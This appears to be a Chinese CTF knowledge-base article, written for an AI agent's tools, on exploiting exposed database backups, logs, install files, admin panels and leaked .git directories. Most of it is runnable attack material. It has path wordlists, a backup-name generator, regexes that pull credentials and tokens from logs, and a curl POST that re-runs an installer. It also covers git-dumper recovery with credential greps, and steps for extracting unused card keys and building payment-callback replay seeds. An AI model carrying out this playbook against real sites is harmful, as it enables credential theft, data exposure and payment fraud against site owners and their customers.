---
id: "ctf-website/24-database/05-backup-log-leak"
title: "Database Backup & Log Leak — 数据库备份与日志泄露"
title_en: "Database Backup & Log Leak — Backup Files & Log Exposure"
summary: >
  运维疏忽导致的数据库直接暴露：SQL备份文件（.sql/.dump/.tar.gz）路径枚举与时间戳猜测、MySQL慢查询/通用查询日志泄露完整SQL语句、安装文件残留（install.sql默认管理员密码哈希）、phpMyAdmin/Adminer未授权访问，以及.git源码泄露恢复数据库凭证。
summary_en: >
  Direct database exposure from operational negligence: SQL backup file (.sql, .dump, .tar.gz) path enumeration and timestamp guessing, MySQL slow/general query log leaks containing full SQL statements, installation file remnants (install.sql with default admin password hashes), phpMyAdmin/Adminer unauthorized access, and .git source code recovery for database credentials.
board: "ctf-website"
category: "24-database"
signals:
  - ".sql .dump 备份文件"
  - "backup_20250101.sql"
  - "slow.log general.log MySQL"
  - "install/install.sql"
  - "phpMyAdmin /phpmyadmin/"
  - "Adminer /adminer.php"
  - ".git/HEAD git-dumper"
  - "install.lock"
mcp_tools:
  - "http_probe"
  - "kb_router"
  - "kb_read_file"
keywords:
  - "数据库备份泄露"
  - ".sql 文件"
  - "备份路径枚举"
  - "日志泄露"
  - "phpMyAdmin"
  - "Adminer"
  - "install.sql"
  - "Git 泄露"
  - "慢查询日志"
  - "源码恢复"
difficulty: "advanced"
tags:
  - "database"
  - "backup"
  - "logs"
  - "information-disclosure"
  - "phmyadmin"
  - "git-leak"
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/24-database/04-config-exposure", "ctf-website/24-database/01-sqli-fundamentals", "ctf-website/12-payment/payment-digital-goods"]
---
# Database Backup & Log Leak — 数据库备份与日志泄露

> SQL 备份文件、日志文件、安装残留——运维疏忽导致的数据库直接暴露。

## 关键词

`数据库备份` `.sql泄露` `备份文件` `日志泄露` `安装残留` `install.sql` `dump.sql` `慢查询日志` `general_log` `phpMyAdmin` `Adminer` `数据库导出`

## 1. 备份文件常见路径

### 1.1 根目录备份

```
/db.zip
/data.zip
/backup.zip
/database.zip
/sql.zip
/wwwroot.zip
/web.zip
/1.zip / 2.zip / 3.zip
/2024.zip / 2025.zip / 2026.zip
```

### 1.2 SQL 文件

```
/data.sql
/db.sql
/backup.sql
/database.sql
/dump.sql
/all.sql
/export.sql
/install.sql
/mysql.sql
/shuadan.sql
```

### 1.3 压缩备份

```
/data.tar.gz
/backup.tar.gz
/db.tar.gz
/www.tar.gz
/mysql.tar.gz
/sql.tar.gz
/backup.rar
/data.rar
```

### 1.4 目录备份

```
/backup/
/backups/
/data/backup/
/data/sql/
/database/backup/
/sqlbackup/
/dbbackup/
/export/
/dump/
```

## 2. 时间戳猜测

备份文件常用日期命名：

```
backup_20250101.sql
db_202501.zip
database_2025-01-01.sql.gz
mysql_dump_20250101_120000.sql
```

### 2.1 候选路径生成器

把站点名、目录名、年份、常见后缀组合起来，命中率比静态字典高很多。

```python
from datetime import date, timedelta

def backup_candidates(host="example", roots=("", "backup", "data", "db")):
    names = {host, "db", "database", "data", "backup", "dump", "mysql", "www", "web"}
    exts = ["sql", "sql.gz", "dump", "zip", "tar.gz", "rar", "7z", "bak", "old"]
    today = date.today()
    dates = {
        today.strftime("%Y%m%d"),
        today.strftime("%Y-%m-%d"),
        str(today.year),
        str(today.year - 1),
    }
    for root in roots:
        prefix = f"/{root.strip('/')}/" if root else "/"
        for name in names:
            for ext in exts:
                yield f"{prefix}{name}.{ext}"
                yield f"{prefix}{name}_backup.{ext}"
                for d in dates:
                    yield f"{prefix}{name}_{d}.{ext}"
                    yield f"{prefix}{d}_{name}.{ext}"

for path in backup_candidates("shop"):
    print(path)
```

命中判断：`200` + `Content-Length` 大、`application/octet-stream`、`Last-Modified` 接近部署时间、文件头为 `PK`/`1F 8B`/SQL 文本。`403` 也要记录，可能说明路径存在但目录规则拦下载。

## 3. 日志文件泄露

### 3.1 MySQL 日志

```
-- 慢查询日志路径
/var/log/mysql/slow.log
/var/log/mysql/mysql-slow.log

-- 通用查询日志 (记录所有SQL!)
/var/log/mysql/general.log
```

### 3.2 应用日志

```
/runtime/log/              (ThinkPHP)
/storage/logs/             (Laravel)
/var/log/                  (Linux)
/logs/
/log/
/error.log
/access.log
/debug.log
```

日志文件中可能包含：
- 完整 SQL 语句（包括 INSERT 的敏感数据）
- 数据库连接字符串
- API 密钥和 Token

### 3.3 日志提取正则

```python
import re

PATTERNS = {
    "mysql_dsn": re.compile(r"(mysql|pgsql|postgres)://[^\\s'\"<>]+", re.I),
    "pdo": re.compile(r"PDO\\([^)]*(mysql|pgsql|sqlite)[^)]*\\)", re.I),
    "sql_insert": re.compile(r"INSERT\\s+INTO\\s+[`\\w]+.*", re.I),
    "sql_error": re.compile(r"(SQLSTATE\\[[^]]+\\]|You have an error in your SQL syntax|ORA-\\d+)", re.I),
    "token": re.compile(r"(api[_-]?key|token|secret|password)\\s*[:=]\\s*['\"]?([^'\"\\s]+)", re.I),
}

def scan_log(text):
    for name, rx in PATTERNS.items():
        for m in rx.finditer(text):
            print(name, m.group(0)[:220])
```

日志里看到 `SELECT ... WHERE username='x'`，可以反推注入闭合方式；看到 `INSERT INTO users`，可以直接定位用户表字段顺序。

### 3.4 从日志反推 SQLi payload

日志里的 SQL 模板是最好的 payload 生成器。不要只搜 `password`，还要搜支付表的订单号、金额、卡密、回调字段。

| 日志片段 | SQL 上下文 | Payload 方向 |
|----------|------------|--------------|
| `WHERE id = 123` | 整数条件 | `1 AND 1=2`、`UNION SELECT` |
| `WHERE email = 'a@b.com'` | 字符串条件 | `' AND '1'='2`、报错函数 |
| `ORDER BY created_at desc` | 排序上下文 | `CASE WHEN(...) THEN created_at ELSE id END` |
| `LIMIT 20 OFFSET 0` | 分页上下文 | 超大/负数/子查询表达式 |
| `INSERT INTO orders (...) VALUES (...)` | 写入上下文 | 二阶注入、字段错位 |
| `UPDATE orders SET status='paid'` | 支付状态更新 | 状态机与回调重放 |

```python
import re

SQL_RX = re.compile(r"\b(SELECT|INSERT|UPDATE|DELETE)\b.{0,600}", re.I | re.S)
PAY_FIELDS = re.compile(r"(order|trade|amount|price|paid|status|coupon|card|key|token|flag)", re.I)

def extract_sql_templates(log_text):
    for m in SQL_RX.finditer(log_text):
        sql = " ".join(m.group(0).split())
        score = len(PAY_FIELDS.findall(sql))
        if score:
            print(f"[score={score}] {sql[:500]}")
```

## 4. 安装文件残留

### 4.1 安装目录

```
/install/
/install/index.php
/install/install.sql
/install/data.sql
/install/sql/install.sql
```

安装 SQL 文件包含：
- 完整数据库结构（CREATE TABLE）
- 默认管理员账号密码哈希
- 初始配置数据

### 4.2 安装锁文件

```
/install/install.lock      # 内容 "ok" → 已安装
/install/lock
/data/install.lock
```

### 4.3 安装绕过

```bash
# 尝试直接 POST 安装表单
curl -X POST target/install/index.php?s=install \
  -d "hostname=127.0.0.1&database=test&username=root&password=&prefix=shua"
```

## 5. 数据库管理工具

### 5.1 phpMyAdmin

```
/phpmyadmin/
/pma/
/mysql/
/phpmyadmin/index.php
/admin/phpmyadmin/
```

### 5.2 Adminer

```
/adminer.php
/db.php
/editor.php
/sql.php
/admin/adminer.php
```

### 5.3 其他工具

```
/phpminiadmin.php
/sqlbuddy/
/adminer/
/dbadmin/
```

## 6. Git 泄露与源码恢复

```bash
# 检测 .git 泄露
curl target/.git/HEAD

# 使用工具恢复
git-dumper target/.git output/
```

### 6.1 Git 泄露后定位数据库信息

```bash
rg -n "DB_HOST|DB_DATABASE|DB_USERNAME|DB_PASSWORD|DATABASE_URL|MYSQL|PGSQL|REDIS|MONGO" output/
rg -n "create table|insert into|select .* from|where .*\\$|order by .*\\$" output/
git -C output log --oneline --all --decorate -20
git -C output grep -n "password\\|secret\\|token\\|flag" $(git -C output rev-list --all)
```

重点文件：

```text
.env
config.php
database.php
settings.py
config/database.yml
application.yml
docker-compose.yml
backup.sql
migrations/
seeders/
```

### 6.2 Dump 快速解析

```python
import re
from pathlib import Path

def summarize_sql_dump(path):
    text = Path(path).read_text(errors="ignore")
    tables = re.findall(r"CREATE TABLE [`\"]?([^`\"\\s(]+)", text, re.I)
    inserts = re.findall(r"INSERT INTO [`\"]?([^`\"\\s(]+)", text, re.I)
    interesting = [t for t in set(tables + inserts)
                   if re.search(r"user|admin|flag|token|secret|config|order", t, re.I)]
    print("[tables]", tables[:50])
    print("[interesting]", interesting)
    for table in interesting:
        m = re.search(rf"INSERT INTO [`\"]?{re.escape(table)}[`\"]?.{{0,500}}", text, re.I | re.S)
        if m:
            print(f"[sample:{table}]", m.group(0)[:500])
```

遇到大 dump：先 `rg -n "flag\\{|CTF\\{|admin|password|token|secret" dump.sql`，再按表拆分；不要先整库导入。

### 6.3 支付/订单表定位

支付题拿到 dump 后，优先找“订单账本”和“权益账本”的断点：订单表、支付流水表、卡密表、优惠券表、发货表。

```python
import re
from pathlib import Path

TABLE_HINTS = re.compile(
    r"(order|trade|payment|pay_|invoice|refund|coupon|voucher|card|kami|cdk|license|"
    r"goods|product|sku|plan|subscription|vip|balance|wallet|credit|flag)",
    re.I,
)

CREATE_RX = re.compile(r"CREATE TABLE [`\"]?([^`\"\s(]+)[^;]+;", re.I | re.S)
INSERT_RX = re.compile(r"INSERT INTO [`\"]?([^`\"\s(]+)[^;]+;", re.I | re.S)

def payment_dump_map(path):
    text = Path(path).read_text(errors="ignore")
    tables = {}
    for rx, kind in ((CREATE_RX, "schema"), (INSERT_RX, "sample")):
        for name, body in rx.findall(text):
            if TABLE_HINTS.search(name) or TABLE_HINTS.search(body):
                item = tables.setdefault(name, {})
                item[kind] = " ".join(body[:800].split())
    for name, item in sorted(tables.items()):
        print("\n==", name, "==")
        print("[schema]", item.get("schema", "")[:600])
        print("[sample]", item.get("sample", "")[:600])
```

字段优先级：

| 表/字段 | 价值 |
|---------|------|
| `orders.status`, `orders.pay_status`, `paid_at` | 判断状态机终态 |
| `orders.amount`, `pay_amount`, `total_fee` | 判断分/元、精度、折扣 |
| `out_trade_no`, `transaction_id`, `notify_id` | 回调重放和幂等键 |
| `card_key`, `kami`, `cdk`, `download_url` | 虚拟商品发货 |
| `coupon.used`, `balance_log`, `wallet_log` | 重复使用与账本差异 |
| `users.vip_until`, `subscription_until`, `credits` | 权益到账与残留 |

## 7. 命中后的订单/卡密抽取路线

备份和日志命中后，优先产出“可操作索引”，而不是整库笔记。对支付/订单题，最有价值的是表关系、最近订单、未核销凭证、回调 raw body、签名字段、安装默认账号。

| 命中物 | 第一轮提取 | 第二轮动作 |
|---|---|---|
| SQL dump | `CREATE TABLE`、`INSERT INTO` 的表/字段 | 订单账本、卡密表、配置表 |
| 应用日志 | SQL 模板、回调 raw body、错误栈 | 反推 SQLi 闭合与回调字段 |
| Git dump | `.env`、路由、控制器、migrations | 配置 Pivot + 业务 API |
| install.sql | 默认 admin、表前缀、初始配置 | 后台登录/订单表定位 |
| 压缩网站备份 | `config.php`、`ajax.php`、`notify.php` | 平台指纹和签名实现 |

### 7.1 Dump 到订单图谱

```python
# dump_payment_graph.py — 从 SQL dump 生成订单/卡密/回调图谱
import json
import re
from pathlib import Path

CREATE_RX = re.compile(r"CREATE TABLE [`\"]?([^`\"\s(]+)(.*?);", re.I | re.S)
COL_RX = re.compile(r"[`\"]?([a-zA-Z0-9_]+)[`\"]?\s+(?:int|varchar|char|text|decimal|datetime|timestamp)", re.I)
HINTS = re.compile(r"order|trade|pay|notify|card|kami|cdk|coupon|wallet|balance|config|user", re.I)

def build_graph(path):
    text = Path(path).read_text(encoding="utf-8", errors="ignore")
    nodes = []
    for table, body in CREATE_RX.findall(text):
        cols = COL_RX.findall(body)
        score = int(bool(HINTS.search(table))) + sum(1 for c in cols if HINTS.search(c))
        if score:
            nodes.append({"table": table, "score": score, "columns": cols[:80]})
    print(json.dumps(sorted(nodes, key=lambda x: (-x["score"], x["table"])), ensure_ascii=False, indent=2))
```

### 7.2 日志到回调重放材料

日志里若出现 `notify_url`、`out_trade_no`、`trade_no`、`sign`、`raw xml/json`，直接整理成 `callback_replay_seed.jsonl`：

```json
{"endpoint":"/notify.php","out_trade_no":"202607040001","amount":"0.01","status":"success","sign_type":"MD5","raw_source":"runtime.log:188"}
```

成功样本：dump 中抽到未使用卡密、日志中抽到合法回调样本、源码中定位签名拼接函数、安装 SQL 中抽到后台账号或表前缀。失败样本：备份仅静态资源、日志无 SQL/回调字段、dump 只含空 schema。

## 攻击链 / 工作流

```
1. 从站点名、目录名、时间戳、部署习惯生成备份候选路径
2. 探测 .sql/.dump/.zip/.tar.gz/.bak/.old/.log/.git 等静态资源
3. 对命中文件先记录响应头、大小、hash，再下载到隔离目录分析
4. 解压/解析后提取 schema、用户表、订单表、支付流水、卡密表、日志中的 SQL/Token/错误栈
5. 关联配置泄露与源码恢复：定位数据库连接、后台路径、框架版本
6. 对 Git 泄露执行最小恢复，确认源码/配置/历史提交是否含敏感信息
7. 将 dump/log/source/install 命中物转成订单图谱、卡密候选、回调样本和配置 Pivot
8. 输出影响面：泄露表、时间范围、字段类型、订单/权益账本和下一跳入口
```

## Evidence

| 证据类型 | 记录内容 |
|----------|----------|
| 文件命中 | URL、状态码、Content-Length、ETag/Last-Modified |
| 完整性 | SHA256、文件大小、解压后的文件列表 |
| 数据内容 | 表名、字段名、样例行、日志关键片段 |
| 源码恢复 | `.git/HEAD`、恢复提交、敏感文件路径 |
| 支付账本 | 订单表、支付流水表、卡密/权益表、状态字段和金额字段 |
| 回调材料 | notify endpoint、raw body、sign/sign_type、订单号、金额字段 |

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 backup leak、log leak、git exposure 搜索 |
| HTTP 探测 | `http_probe` | 批量验证候选备份/日志路径 |
| 工具执行 | `run_ctf_tool` | 调用 git-dumper、目录枚举、解包/解析脚本 |
| 证据记录 | `workspace_write_text` | 保存文件哈希、字段样例和恢复清单 |

## 8. 关联技术

- [[04-config-exposure]] — 配置文件泄露
- [[01-sqli-fundamentals]] — 数据库连接后的利用
- [[file-upload-xxe-lfi]] — 文件读取
